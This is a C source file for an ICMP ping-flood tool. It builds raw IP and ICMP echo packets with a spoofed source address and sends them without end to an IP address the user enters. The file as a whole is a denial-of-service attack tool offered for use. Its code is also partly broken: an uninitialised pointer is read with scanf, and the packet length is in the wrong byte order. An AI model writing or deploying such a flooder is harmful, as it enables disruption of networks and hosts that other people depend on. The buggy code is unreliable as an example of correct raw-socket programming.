#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>

// ICMP Header
struct icmphdr {
    u_int8_t type;
    u_int8_t code;
    u_int16_t checksum;
    union {
        struct {
            u_int16_t id;
            u_int16_t sequence;
        } echo;
        u_int32_t gateway;
        struct {
            u_int16_t __unused;
            u_int16_t mtu;
        } frag;
    } un;
};

// Pseudo header needed for checksum calculation
struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t length;
};

// Compute checksum
unsigned short checksum(void *data, int len) {
    unsigned short *buf = data;
    unsigned int sum = 0;
    unsigned short result;

    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }

    if (len == 1) {
        sum += *(unsigned char *)buf;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;

    return result;
}

// Create the IP header
void fill_ip_header(struct iphdr *iph, const char *src_ip, const char *dst_ip) {
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr) + 64; // 64 bytes of ICMP data
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_ICMP;
    iph->check = 0; // Leave checksum 0 now, filled later
    iph->saddr = inet_addr(src_ip);
    iph->daddr = inet_addr(dst_ip);

    iph->check = checksum((unsigned short *)iph, sizeof(struct iphdr));
}

// Create the ICMP header
void fill_icmp_header(struct icmphdr *icmph) {
    icmph->type = 8; // Echo Request
    icmph->code = 0;
    icmph->checksum = 0; // Leave checksum 0 now, filled later
    icmph->un.echo.id = htons(1234); // Arbitrary ID
    icmph->un.echo.sequence = htons(1); // Sequence number
}

// Calculate ICMP checksum
unsigned short calculate_icmp_checksum(struct icmphdr *icmph, char *data, u_int16_t data_len) {
    char buffer[4096];
    memcpy(buffer, icmph, sizeof(struct icmphdr));
    memcpy(buffer + sizeof(struct icmphdr), data, data_len);

    return checksum((unsigned short *)buffer, sizeof(struct icmphdr) + data_len);
}

void flood(const char *ipDestination) {
    while (1)
    {
        int sock;
        struct sockaddr_in dest;
        struct iphdr iph;
        struct icmphdr icmph;
        char packet[4096];
        char data[64]; // Data payload for ICMP (64 bytes)

        // Initialize data payload with arbitrary content
        memset(data, 'A', sizeof(data));

        // Create a raw socket
        sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if (sock < 0) {
            perror("Socket creation failed");
        }

        // Zero out the packet buffer
        memset(packet, 0, sizeof(packet));

        // Fill IP header
        fill_ip_header(&iph, "192.168.0.1", ipDestination); // Source IP and destination IP

        // Fill ICMP header
        fill_icmp_header(&icmph);

        // Calculate and set ICMP checksum
        icmph.checksum = calculate_icmp_checksum(&icmph, data, sizeof(data));

        // Copy IP and ICMP headers and data into packet
        memcpy(packet, &iph, sizeof(struct iphdr));
        memcpy(packet + sizeof(struct iphdr), &icmph, sizeof(struct icmphdr));
        memcpy(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), data, sizeof(data));

        // Destination address
        dest.sin_family = AF_INET;
        dest.sin_port = 0; // No port for ICMP
        dest.sin_addr.s_addr = iph.daddr;

        // Send the packet
        if (sendto(sock, packet, iph.tot_len, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
            perror("Send failed");
            close(sock);
        }

        printf("ICMP Echo Request sent successfully\n");

        // Close the socket
        close(sock);
    }
    
}

int main() {
    char *targetIP;

    printf("Enter IP Address Target >> "); scanf("%c", targetIP);

    flood(targetIP);

    return 0;
}
// gcc -o send_raw_icmp send_raw_icmp.c
